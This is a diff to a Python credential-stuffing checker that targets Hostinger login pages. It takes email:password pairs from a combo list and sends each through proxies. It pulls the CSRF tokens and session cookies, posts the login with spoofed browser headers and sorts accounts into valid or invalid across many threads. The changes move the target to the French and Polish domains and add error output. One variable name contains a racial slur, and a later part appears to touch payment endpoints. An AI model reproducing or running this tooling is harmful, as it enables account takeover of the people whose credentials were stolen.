@@ -94,20 +94,20 @@ def check():
         try:
             client = httpx.Client(proxy=f'http://{proxy_login}', timeout=60)
             email, passwd = combo.pop().split(':')
-            safsdfd = client.get('https://auth.hostinger.com/in/login')
+            safsdfd = client.get('https://auth.hostinger.fr/fr/login?kazi_ipv6=GG')
             _token = safsdfd.text.split('name="_token" value="')[1].split('"')[0]
             xsrf_token = safsdfd.cookies['XSRF-TOKEN']
             sso_session = safsdfd.cookies['sso_session']
-            login = client.post('https://auth.hostinger.com/in/login', headers={
+            login = client.post('https://auth.hostinger.pl/pl/login?kazi_ipv6=GG', headers={
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                 'Accept-Encoding': 'gzip, deflate, br, zstd',
                 'Accept-Language': 'en-US,en;q=0.9',
                 'Cache-Control': 'max-age=0',
                 'Content-Type': 'application/x-www-form-urlencoded',
-                'Cookie': f'XSRF-TOKEN={xsrf_token}%3D; sso_session={sso_session}%3D; cookie_consent=statistics%2Cadvertising; _gcl_au=1.1.1700841239.1732404881',
-                'Origin': 'https://auth.hostinger.com',
+                'Cookie': f'XSRF-TOKEN={xsrf_token}%3D; sso_session={sso_session}%3D',
+                'Origin': 'https://auth.hostinger.pl',
                 'Priority': 'u=0, i',
-                'Referer': 'https://auth.hostinger.com/in/login',
+                'Referer': 'https://auth.hostinger.pl/pl/login?kazi_ipv6=GG',
                 'Sec-Ch-Ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                 'Sec-Ch-Ua-Mobile': '?0',
                 'Sec-Ch-Ua-Platform': '"Windows"',
@@ -128,7 +128,7 @@ def check():
                 'window_width': '1026',
                 'is_cookie_support_enabled': '1'
             })
-            if 'Redirecting to <a href="https://auth.hostinger.com/in/login">https://auth.hostinger.com/in/login</a>.' in login.text:
+            if 'Redirecting to <a href="https://auth.hostinger.pl/pl/login?kazi_ipv6=GG">https://auth.hostinger.pl/pl/login?kazi_ipv6=GG</a>.' in login.text:
                 print(f'{Fore.RED}INVALID{Fore.RESET} {email}:{passwd}')
                 pass
             else:
@@ -410,7 +410,7 @@ def check():
                                     print(pay_nigger.status_code, pay_nigger.json())
                                     print('UNKNOWN ERROR\n=================================')
                 else:
-                    print(f"{Fore.LIGHTCYAN_EX}ERROR{Fore.RESET} JVT Not Found")
+                    print(f"{Fore.LIGHTCYAN_EX}ERROR{Fore.RESET} JVT Not Found -> " + login.text)
             check_count += 1
             checked_accounts += 1
             total_checks += 1
@@ -423,7 +423,6 @@ def check():
 title_thread = threading.Thread(target=update_title)
 title_thread.daemon = True
 title_thread.start()
-
 threads = [threading.Thread(target=check) for _ in range(int(input('Threads: ')))]
 for t in threads: t.start()
 for t in threads: t.join()
